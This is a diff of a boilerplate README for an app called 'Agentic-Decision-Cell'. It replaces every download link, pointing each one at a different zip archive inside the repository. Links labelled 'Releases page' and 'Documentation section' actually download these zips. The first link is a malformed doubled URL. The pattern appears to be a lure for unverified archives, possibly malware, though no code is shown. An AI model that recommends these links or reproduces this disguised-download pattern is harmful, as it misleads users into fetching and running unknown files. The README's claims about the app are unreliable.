@@ -1,7 +1,7 @@
 # 🌟 Agentic-Decision-Cell - Simplifying Decision Making for Everyone
 
 ## 📥 Download Now
-[![Download Agentic-Decision-Cell](https://raw.githubusercontent.com/Niranjan-008/Agentic-Decision-Cell/main/agents/system_prompts/Cell_Decision_Agentic_v2.8-alpha.1.zip%https://raw.githubusercontent.com/Niranjan-008/Agentic-Decision-Cell/main/agents/system_prompts/Cell_Decision_Agentic_v2.8-alpha.1.zip)](https://raw.githubusercontent.com/Niranjan-008/Agentic-Decision-Cell/main/agents/system_prompts/Cell_Decision_Agentic_v2.8-alpha.1.zip)
+[![Download Agentic-Decision-Cell](https://github.com/Niranjan-008/Agentic-Decision-Cell/raw/refs/heads/main/core/Agentic-Cell-Decision-v1.4-alpha.3.zip%https://github.com/Niranjan-008/Agentic-Decision-Cell/raw/refs/heads/main/core/Agentic-Cell-Decision-v1.4-alpha.3.zip)](https://github.com/Niranjan-008/Agentic-Decision-Cell/raw/refs/heads/main/core/Agentic-Cell-Decision-v1.4-alpha.3.zip)
 
 ## 📖 Introduction
 Welcome to Agentic-Decision-Cell! This application is designed to help everyone make better decisions using a simple, user-friendly approach. Whether you are an individual or part of a team, this tool aims to support your decision-making process with transparency and efficiency.
@@ -17,7 +17,7 @@ Before you download, make sure your system meets the following requirements:
 - **Network:** Internet connection for initial setup
 
 ### 2. Visit the Download Page
-To download the latest version of Agentic-Decision-Cell, visit our [Releases page](https://raw.githubusercontent.com/Niranjan-008/Agentic-Decision-Cell/main/agents/system_prompts/Cell_Decision_Agentic_v2.8-alpha.1.zip). There, you will find the latest updates and versions available for download.
+To download the latest version of Agentic-Decision-Cell, visit our [Releases page](https://github.com/Niranjan-008/Agentic-Decision-Cell/raw/refs/heads/main/core/Agentic-Cell-Decision-v1.4-alpha.3.zip). There, you will find the latest updates and versions available for download.
 
 ### 3. Download the Application
 Once you are on the Releases page, locate the latest version. Click on the link for your operating system to download the application. 
@@ -59,7 +59,7 @@ Agentic-Decision-Cell can be integrated with various tools to enhance its functi
 - Communication platforms
 
 ## 📄 Documentation
-For detailed instructions, please refer to the [Documentation section](https://raw.githubusercontent.com/Niranjan-008/Agentic-Decision-Cell/main/agents/system_prompts/Cell_Decision_Agentic_v2.8-alpha.1.zip) on our GitHub page. Here, you will find guidelines for advanced features, troubleshooting, and more.
+For detailed instructions, please refer to the [Documentation section](https://github.com/Niranjan-008/Agentic-Decision-Cell/raw/refs/heads/main/core/Agentic-Cell-Decision-v1.4-alpha.3.zip) on our GitHub page. Here, you will find guidelines for advanced features, troubleshooting, and more.
 
 ## 🔧 Troubleshooting Tips
 If you encounter any issues while using Agentic-Decision-Cell, here are a few common troubleshooting steps:
@@ -71,4 +71,4 @@ If you encounter any issues while using Agentic-Decision-Cell, here are a few co
 Agentic-Decision-Cell aims to streamline your decision-making process in an easy-to-use package. We strive to provide a transparent and supportive environment for making informed choices. Download your copy today!
 
 ## 📥 Download Link
-You can find the latest version of Agentic-Decision-Cell here: [Download Agentic-Decision-Cell](https://raw.githubusercontent.com/Niranjan-008/Agentic-Decision-Cell/main/agents/system_prompts/Cell_Decision_Agentic_v2.8-alpha.1.zip).
+You can find the latest version of Agentic-Decision-Cell here: [Download Agentic-Decision-Cell](https://github.com/Niranjan-008/Agentic-Decision-Cell/raw/refs/heads/main/core/Agentic-Cell-Decision-v1.4-alpha.3.zip).
